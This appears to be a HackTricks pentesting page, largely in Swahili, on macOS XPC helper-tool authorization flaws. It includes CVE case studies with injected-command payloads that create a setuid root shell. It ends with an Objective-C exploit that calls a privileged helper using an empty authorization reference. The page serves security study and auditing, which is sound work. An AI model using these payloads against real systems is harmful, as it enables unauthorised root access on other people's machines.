# macOS XPC Uidhinishaji

{{#include ../../../../../banners/hacktricks-training.md}}

## Uidhinishaji wa XPC

Apple pia inapendekeza njia nyingine ya kuthibitisha ikiwa mchakato unaounganisha una **idhini za kuita method ya XPC iliyowekwa wazi**.

Wakati programu inahitaji **kutekeleza vitendo kama mtumiaji mwenye ruhusa za juu**, badala ya kuendesha app kama mtumiaji mwenye ruhusa za juu kawaida huweka kama root HelperTool kama huduma ya XPC ambayo inaweza kuitwa kutoka app kutekeleza vitendo hivyo. Hata hivyo, app inayoitwa huduma inapaswa kuwa na uidhinishaji wa kutosha.

### ShouldAcceptNewConnection daima YES

Mfano unaweza kupatikana katika [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). Katika `App/AppDelegate.m` inajaribu **kuunganisha** na **HelperTool**. Na katika `HelperTool/HelperTool.m` function **`shouldAcceptNewConnection`** **haitachunguza** yoyote ya mahitaji yaliyotajwa hapo juu. Itakuwa daima inarudisha YES:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Kwa habari zaidi kuhusu jinsi ya kusanidi vizuri ukaguzi huu:


{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Haki za programu

Hata hivyo, kuna baadhi ya **authorization inayofanyika wakati method kutoka HelperTool inapoitwa**.

Kazi **`applicationDidFinishLaunching`** kutoka `App/AppDelegate.m` itaunda marejeo ya authorization tupu baada ya app kuanza. Hii inapaswa kufanya kazi kila wakati.\
Kisha, itajaribu **kuongeza baadhi ya haki** kwa marejeo hayo ya authorization kwa kuita `setupAuthorizationRights`:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
Kazi `setupAuthorizationRights` kutoka `Common/Common.m` itahifadhi katika database ya uthibitishaji `/var/db/auth.db` haki za programu. Kumbuka jinsi itakavyoongeza tu haki ambazo bado hazipo katika database:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
Kazi `enumerateRightsUsingBlock` ndiyo inayotumika kupata ruhusa za programu, ambazo zimetambulishwa katika `commandInfo`:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
Hii inamaanisha kwamba mwishoni mwa mchakato huu, ruhusa zilizoelezwa ndani ya `commandInfo` zitawekwa katika `/var/db/auth.db`. Angalia jinsi huko unaweza kupata kwa **kila mbinu** ambayo itakuwa **inayohitaji uthibitisho**, **jina la ruhusa** na **`kCommandKeyAuthRightDefault`**. Hili la mwisho **linaonyesha nani anaweza kupata haki hii**.

Kuna mawigo tofauti kuonyesha nani anaweza kupata haki. Baadhi yao zimetamkwa katika [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (you can find [all of them in here](https://www.dssw.co.uk/reference/authorization-rights/)), lakini kwa muhtasari:

<table><thead><tr><th width="284.3333333333333">Jina</th><th width="165">Thamani</th><th>Maelezo</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Mtu yeyote</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Hakuna mtu</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>Mtumiaji wa sasa anatakiwa kuwa admin (ndani ya kikundi cha admin)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Muulize mtumiaji kuthibitisha.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Muulize mtumiaji kuthibitisha. Mtumiaji lazima awe admin (ndani ya kikundi cha admin)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Taja sheria</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Toa maoni ya ziada kuhusu haki hiyo</td></tr></tbody></table>

### Uhakiki wa Haki

In `HelperTool/HelperTool.m` the function **`readLicenseKeyAuthorization`** checks if the caller is authorized to **kutekeleza njia hiyo** calling the function **`checkAuthorization`**. This function will check the **authData** sent by the calling process has a **muundo sahihi** and then will check **nini kinahitajika ili kupata haki** to call the specific method. If all goes good the **returned `error` will be `nil`**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Kumbuka kwamba ili **kuangalia mahitaji ya kupata haki** ya kuita njia hiyo, function `authorizationRightForCommand` itachunguza tu kitu cha maelezo kilichotajwa hapo awali **`commandInfo`**. Kisha, itaita **`AuthorizationCopyRights`** kuangalia **ikiwa ina haki** ya kuita function (kumbuka kuwa bendera zinawezesha mwingiliano na mtumiaji).

Katika kesi hii, ili kuita function `readLicenseKeyAuthorization`, `kCommandKeyAuthRightDefault` imefafanuliwa kuwa `@kAuthorizationRuleClassAllow`. Kwa hivyo **mtu yeyote anaweza kuiita**.

### Taarifa za DB

Imetajwa kuwa taarifa hizi zimetunzwa katika `/var/db/auth.db`. Unaweza kuorodhesha sheria zote zilizohifadhiwa kwa:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Kisha, unaweza kusoma ni nani anayeweza kufikia haki hiyo kwa:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Haki za kuruhusu

Unaweza kupata **mipangilio yote ya ruhusa** [**hapa**](https://www.dssw.co.uk/reference/authorization-rights/), lakini mchanganyiko ambao hautahitaji mwingiliano wa mtumiaji ni:

1. **'authenticate-user': 'false'**
- Hii ni funguo ya moja kwa moja zaidi. Ikiwekwa kwa `false`, inaonyesha kuwa mtumiaji hahitaji kutoa uthibitisho ili kupata haki hii.
- Hii hutumiwa kwa **mchanganyiko na moja ya mbili zilizo hapa chini au kwa kuonyesha kikundi** ambacho mtumiaji anatakiwa kuwa nacho.
2. **'allow-root': 'true'**
- Ikiwa mtumiaji anafanya kazi kama root user (ambaye ana ruhusa zilizoinuliwa), na funguo hili limewekwa kuwa `true`, root user anaweza kupata haki hii bila uthibitisho zaidi. Hata hivyo, kwa kawaida, kupata hadhi ya root user tayari kunahitaji uthibitisho, kwa hivyo hili si hali ya 'hakuna uthibitisho' kwa watumiaji wengi.
3. **'session-owner': 'true'**
- Ikiwa imewekwa kuwa `true`, mmiliki wa kikao (mtumiaji aliyeingia sasa) atapata haki hii moja kwa moja. Hii inaweza kupitisha uthibitisho wa ziada ikiwa mtumiaji tayari ameingia.
4. **'shared': 'true'**
- Funguo hili halitoi ruhusa bila uthibitisho. Badala yake, ikiwa limewekwa kuwa `true`, ina maana kwamba mara haki itakapothibitishwa, inaweza kushirikiwa kati ya mchakato mbalimbali bila kila mmoja kuhitaji kuthibitisha tena. Lakini utoaji wa awali wa haki bado utahitaji uthibitisho isipokuwa ikichanganywa na funguo nyingine kama `'authenticate-user': 'false'`.

Unaweza [**tumia script hii**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) kupata haki zenye kuvutia:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Masomo ya Kesi za Kupitisha Idhini

- **CVE-2025-65842 – Acustica Audio Aquarius HelperTool**: Huduma ya Mach yenye ruhusa `com.acustica.HelperTool` inakubali kila muunganisho na rutina yake `checkAuthorization:` inaita `AuthorizationCopyRights(NULL, …)`, hivyo chochote 32‑byte blob hupita. `executeCommand:authorization:withReply:` kisha hutoa strings zilizo chini ya udhibiti wa mshambuliaji, zilizotenganishwa kwa koma, kwa `NSTask` kama root, ikitengeneza payloads kama:
```bash
"/bin/sh,-c,cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
```
inaweza kuunda kwa urahisi SUID root shell. Maelezo katika [this write-up](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/).
- **CVE-2025-55076 – Plugin Alliance InstallationHelper**: Msikilizi daima hurudisha YES na muundo uleule wa NULL `AuthorizationCopyRights` unaonekana katika `checkAuthorization:`. Mbinu `exchangeAppWithReply:` inaunganisha attacker input ndani ya string ya `system()` mara mbili, hivyo kuingiza metacharacters za shell katika `appPath` (mfano `"/Applications/Test.app";chmod 4755 /tmp/rootbash;`) kunatoa utekelezaji wa msimbo kama root kupitia Mach service `com.plugin-alliance.pa-installationhelper`. More info [here](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/).
- **CVE-2024-4395 – Jamf Compliance Editor helper**: Kukuza audit kunashusha `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist`, kunaonyesha Mach service `com.jamf.complianceeditor.helper`, na ku-expose `-executeScriptAt:arguments:then:` bila kuthibitisha AuthorizationExternalForm ya caller au code signature. Exploit rahisi ina-`AuthorizationCreate` reference tupu, ina-connect kwa `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]`, na inaanzisha method hiyo kutekeleza binaries yoyote kama root. Full reversing notes (plus PoC) in [Mykola Grymalyuk’s write-up](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html).
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 and 7.4.0–7.4.2 zilikubali crafted XPC messages ambazo zilifikia helper yenye privilage bila vizuizi vya authorization. Kwa kuwa helper ilimtegemea `AuthorizationRef` yake yenye privilage, mtumiaji yeyote wa ndani aliyeweza kumtumia ujumbe service angeweza kulazimisha kutekeleza mabadiliko ya konfigurasi au amri yoyote kama root. Details in [SentinelOne’s advisory summary](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/).

#### Vidokezo vya tathmini ya haraka

- Wakati app ina GUI na helper pamoja, linganisha mahitaji yao ya code na angalia kama `shouldAcceptNewConnection` inafunga listener kwa `-setCodeSigningRequirement:` (au inathibitisha `SecCodeCopySigningInformation`). Ukosefu wa ukaguzi kawaida husababisha matukio ya CWE-863 kama kesi ya Jamf. Kuangalia kwa haraka kunaonekana kama:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- Linganisha kile ambacho helper *anafikiri* anaruhusu na kile mteja anachotoa. Unaporudisha nyuma (reversing), simama kwenye `AuthorizationCopyRights` na thibitisha kwamba `AuthorizationRef` inatokana na `AuthorizationCreateFromExternalForm` (iliyotolewa na mteja) badala ya muktadha wenye ruhusa wa helper, vinginevyo kuna uwezekano umebaini muundo wa CWE-863 unaofanana na kesi zilizo hapo juu.

## Kurejesha Authorization

### Kukagua ikiwa EvenBetterAuthorization inatumika

Ikiwa unatambua kazi: **`[HelperTool checkAuthorization:command:]`** kuna uwezekano mchakato unatumia mpangilio ulioelezwa hapo awali kwa authorization:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

Kama kazi hii inaita vipengele kama `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree`, basi inatumia [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Kagua **`/var/db/auth.db`** kuona kama inawezekana kupata ruhusa ya kuita tendo lenye ruhusa bila mwingiliano wa mtumiaji.

### Protocol Communication

Kisha, unahitaji kupata muundo wa protocol ili uweze kuanzisha mawasiliano na huduma ya XPC.

Kazi **`shouldAcceptNewConnection`** inaonyesha protocol inayotolewa:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

Katika kesi hii, tuna sawa na katika EvenBetterAuthorizationSample, [**angalia mstari huu**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Ukijua jina la protocol inayotumika, inawezekana ku-dump uainisho wa header yake kwa:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Hatimaye, tunahitaji tu kujua **jina la Mach Service lililotolewa** ili kuanzisha mawasiliano nayo. Kuna njia kadhaa za kupata hili:

- Katika **`[HelperTool init]`** ambapo unaweza kuona Mach Service ikitumiwa:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- Katika launchd plist:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Mfano wa Exploit

Katika mfano huu kimeundwa:

- Ufafanuzi wa protocol pamoja na functions
- auth tupu ya kutumia kuomba ufikiaji
- Muunganisho na huduma ya XPC
- Mwito kwa function ikiwa muunganisho ulifanikiwa
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Wasaidizi wengine wa XPC wa privilege waliotumiwa vibaya

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

## Marejeo

- [https://theevilbit.github.io/posts/secure_coding_xpc_part1/](https://theevilbit.github.io/posts/secure_coding_xpc_part1/)
- [https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [https://www.sentinelone.com/vulnerability-database/cve-2025-25251/](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)
- [https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)
- [https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)

{{#include ../../../../../banners/hacktricks-training.md}}
